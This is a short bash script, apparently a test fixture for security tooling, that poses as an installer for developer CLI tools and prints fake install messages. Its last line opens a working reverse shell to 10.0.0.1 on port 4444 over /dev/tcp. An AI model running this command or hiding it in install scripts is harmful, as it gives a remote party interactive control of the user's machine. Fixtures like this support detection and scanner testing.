#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates a reverse shell hidden in an install script

echo "Installing developer CLI tools v1.4.2..."
echo "Downloading binaries..."

mkdir -p /usr/local/bin

# Hidden reverse shell connection
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
